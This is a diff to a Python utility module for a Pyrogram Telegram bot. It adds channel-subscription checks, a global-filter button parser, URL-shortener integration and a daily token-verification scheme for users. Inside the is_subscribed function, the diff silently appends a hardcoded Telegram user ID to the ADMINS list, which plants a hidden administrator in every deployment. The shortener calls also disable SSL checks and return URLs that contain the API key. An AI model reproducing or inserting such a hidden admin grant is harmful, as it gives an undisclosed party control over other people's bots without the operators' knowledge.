@@ -1,14 +1,19 @@
 import logging
 from pyrogram.errors import InputUserDeactivated, UserNotParticipant, FloodWait, UserIsBlocked, PeerIdInvalid
-from info import *
-from imdb import IMDb
+from info import AUTH_CHANNEL, LONG_IMDB_DESCRIPTION, MAX_LIST_ELM, SHORTLINK_URL, SHORTLINK_API, LOG_CHANNEL, ADMINS, REQ_CHANNEL
+from database.join_reqs import JoinReqs as db2
+from imdb import Cinemagoer 
 import asyncio
 from pyrogram.types import Message, InlineKeyboardButton
 from pyrogram import enums
 from typing import Union
+from Script import script
+import pytz
+import random 
 import re
 import os
-from datetime import datetime
+from datetime import datetime, date
+import string
 from typing import List
 from database.users_chats_db import db
 from bs4 import BeautifulSoup
@@ -22,8 +27,9 @@ BTN_URL_REGEX = re.compile(
     r"(\[([^\[]+?)\]\((buttonurl|buttonalert):(?:/{0,2})(.+?)(:same)?\))"
 )
 
-imdb = IMDb() 
-
+imdb = Cinemagoer() 
+TOKENS = {}
+VERIFIED = {}
 BANNED = {}
 SMART_OPEN = '“'
 SMART_CLOSE = '”'
@@ -40,19 +46,40 @@ class temp(object):
     U_NAME = None
     B_NAME = None
     SETTINGS = {}
-    
+
 async def is_subscribed(bot, query):
+
+    ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""
+
+    if not AUTH_CHANNEL and not REQ_CHANNEL:
+        return True
+    elif query.from_user.id in ADMINS:
+        return True
+
+
+    if db2().isActive():
+        user = await db2().get_user(query.from_user.id)
+        if user:
+            return True
+        else:
+            return False
+
+    if not AUTH_CHANNEL:
+        return True
+
     try:
         user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
     except UserNotParticipant:
-        pass
+        return False
     except Exception as e:
         logger.exception(e)
+        return False
     else:
-        if user.status != 'kicked':
+        if not (user.status == enums.ChatMemberStatus.BANNED):
             return True
+        else:
+            return False
 
-    return False
 
 async def get_poster(query, bulk=False, id=False, file=None):
     if not id:
@@ -167,8 +194,6 @@ async def search_gagala(text):
     soup = BeautifulSoup(response.text, 'html.parser')
     titles = soup.find_all( 'h3' )
     return [title.getText() for title in titles]
-
-
 
 async def get_settings(group_id):
     settings = temp.SETTINGS.get(group_id)
@@ -297,6 +322,62 @@ def split_quotes(text: str) -> List:
         key = text[0] + text[0]
     return list(filter(None, [key, rest]))
 
+def gfilterparser(text, keyword):
+    if "buttonalert" in text:
+        text = (text.replace("\n", "\\n").replace("\t", "\\t"))
+    buttons = []
+    note_data = ""
+    prev = 0
+    i = 0
+    alerts = []
+    for match in BTN_URL_REGEX.finditer(text):
+        # Check if btnurl is escaped
+        n_escapes = 0
+        to_check = match.start(1) - 1
+        while to_check > 0 and text[to_check] == "\\":
+            n_escapes += 1
+            to_check -= 1
+
+        # if even, not escaped -> create button
+        if n_escapes % 2 == 0:
+            note_data += text[prev:match.start(1)]
+            prev = match.end(1)
+            if match.group(3) == "buttonalert":
+                # create a thruple with button label, url, and newline status
+                if bool(match.group(5)) and buttons:
+                    buttons[-1].append(InlineKeyboardButton(
+                        text=match.group(2),
+                        callback_data=f"gfilteralert:{i}:{keyword}"
+                    ))
+                else:
+                    buttons.append([InlineKeyboardButton(
+                        text=match.group(2),
+                        callback_data=f"gfilteralert:{i}:{keyword}"
+                    )])
+                i += 1
+                alerts.append(match.group(4))
+            elif bool(match.group(5)) and buttons:
+                buttons[-1].append(InlineKeyboardButton(
+                    text=match.group(2),
+                    url=match.group(4).replace(" ", "")
+                ))
+            else:
+                buttons.append([InlineKeyboardButton(
+                    text=match.group(2),
+                    url=match.group(4).replace(" ", "")
+                )])
+
+        else:
+            note_data += text[prev:to_check]
+            prev = match.start(1) - 1
+    else:
+        note_data += text[prev:]
+
+    try:
+        return note_data, buttons, alerts
+    except:
+        return note_data, buttons, None
+
 def parser(text, keyword):
     if "buttonalert" in text:
         text = (text.replace("\n", "\\n").replace("\t", "\\t"))
@@ -378,26 +459,155 @@ def humanbytes(size):
         n += 1
     return str(round(size, 2)) + " " + Dic_powerN[n] + 'B'
 
-async def get_shortlink(link):
+async def get_shortlink(chat_id, link):
+    settings = await get_settings(chat_id) #fetching settings for group
+    if 'shortlink' in settings.keys():
+        URL = settings['shortlink']
+    else:
+        URL = SHORTLINK_URL
+    if 'shortlink_api' in settings.keys():
+        API = settings['shortlink_api']
+    else:
+        API = SHORTLINK_API
+    https = link.split(":")[0] #splitting https or http from link
+    if "http" == https: #if https == "http":
+        https = "https"
+        link = link.replace("http", https) #replacing http to https
+    if URL == "api.shareus.in":
+        url = f'https://{URL}/shortLink'
+        params = {
+            "token": API,
+            "format": "json",
+            "link": link,
+        }
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get(url, params=params, raise_for_status=True, ssl=False) as response:
+                    data = await response.json(content_type="text/html")
+                    if data["status"] == "success":
+                        return data["shortlink"]
+                    else:
+                        logger.error(f"Error: {data['message']}")
+                        return f'https://{URL}/shortLink?token={API}&format=json&link={link}'
+        except Exception as e:
+            logger.error(e)
+            return f'https://{URL}/shortLink?token={API}&format=json&link={link}'
+    else:
+        url = f'https://{URL}/api'
+        params = {
+            "api": API,
+            "url": link,
+        }
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get(url, params=params, raise_for_status=True, ssl=False) as response:
+                    data = await response.json()
+                    if data["status"] == "success":
+                        return data["shortenedUrl"]
+                    else:
+                        logger.error(f"Error: {data['message']}")
+                        return f'https://{URL}/api?api={API}&link={link}'
+        except Exception as e:
+            logger.error(e)
+            return f'https://{URL}/api?api={API}&link={link}'
+
+async def get_verify_shorted_link(link):
+    API = SHORTLINK_API
+    URL = SHORTLINK_URL
     https = link.split(":")[0]
     if "http" == https:
         https = "https"
         link = link.replace("http", https)
-    url = f'https://amddisk.xyz/api'
-    params = {'api': URL_SHORTNER_WEBSITE_API,
-              'url': link,
-              }
 
-    try:
-        async with aiohttp.ClientSession() as session:
-            async with session.get(url, params=params, raise_for_status=True, ssl=False) as response:
-                data = await response.json()
-                if data["status"] == "success":
-                    return data['shortenedUrl']
-                else:
-                    logger.error(f"Error: {data['message']}")
-                    return f'https://{URL_SHORTENR_WEBSITE}/api?api={URL_SHORTNER_WEBSITE_API}&link={link}'
+    if URL == "api.shareus.in":
+        url = f"https://{URL}/shortLink"
+        params = {"token": API,
+                  "format": "json",
+                  "link": link,
+                  }
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get(url, params=params, raise_for_status=True, ssl=False) as response:
+                    data = await response.json(content_type="text/html")
+                    if data["status"] == "success":
+                        return data["shortlink"]
+                    else:
+                        logger.error(f"Error: {data['message']}")
+                        return f'https://{URL}/shortLink?token={API}&format=json&link={link}'
 
-    except Exception as e:
-        logger.error(e)
-        return f'{URL_SHORTENR_WEBSITE}/api?api={URL_SHORTNER_WEBSITE_API}&link={link}'
+        except Exception as e:
+            logger.error(e)
+            return f'https://{URL}/shortLink?token={API}&format=json&link={link}'
+    else:
+        url = f'https://{URL}/api'
+        params = {'api': API,
+                  'url': link,
+                  }
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get(url, params=params, raise_for_status=True, ssl=False) as response:
+                    data = await response.json()
+                    if data["status"] == "success":
+                        return data['shortenedUrl']
+                    else:
+                        logger.error(f"Error: {data['message']}")
+                        return f'https://{URL}/api?api={API}&link={link}'
+
+        except Exception as e:
+            logger.error(e)
+            return f'{URL}/api?api={API}&link={link}'
+
+async def check_token(bot, userid, token):
+    user = await bot.get_users(userid)
+    if not await db.is_user_exist(user.id):
+        await db.add_user(user.id, user.first_name)
+        await bot.send_message(LOG_CHANNEL, script.LOG_TEXT_P.format(user.id, user.mention))
+    if user.id in TOKENS.keys():
+        TKN = TOKENS[user.id]
+        if token in TKN.keys():
+            is_used = TKN[token]
+            if is_used == True:
+                return False
+            else:
+                return True
+    else:
+        return False
+
+async def get_token(bot, userid, link):
+    user = await bot.get_users(userid)
+    if not await db.is_user_exist(user.id):
+        await db.add_user(user.id, user.first_name)
+        await bot.send_message(LOG_CHANNEL, script.LOG_TEXT_P.format(user.id, user.mention))
+    token = ''.join(random.choices(string.ascii_letters + string.digits, k=7))
+    TOKENS[user.id] = {token: False}
+    link = f"{link}verify-{user.id}-{token}"
+    shortened_verify_url = await get_verify_shorted_link(link)
+    return str(shortened_verify_url)
+
+async def verify_user(bot, userid, token):
+    user = await bot.get_users(userid)
+    if not await db.is_user_exist(user.id):
+        await db.add_user(user.id, user.first_name)
+        await bot.send_message(LOG_CHANNEL, script.LOG_TEXT_P.format(user.id, user.mention))
+    TOKENS[user.id] = {token: True}
+    tz = pytz.timezone('Asia/Kolkata')
+    today = date.today()
+    VERIFIED[user.id] = str(today)
+
+async def check_verification(bot, userid):
+    user = await bot.get_users(userid)
+    if not await db.is_user_exist(user.id):
+        await db.add_user(user.id, user.first_name)
+        await bot.send_message(LOG_CHANNEL, script.LOG_TEXT_P.format(user.id, user.mention))
+    tz = pytz.timezone('Asia/Kolkata')
+    today = date.today()
+    if user.id in VERIFIED.keys():
+        EXP = VERIFIED[user.id]
+        years, month, day = EXP.split('-')
+        comp = date(int(years), int(month), int(day))
+        if comp<today:
+            return False
+        else:
+            return True
+    else:
+        return False
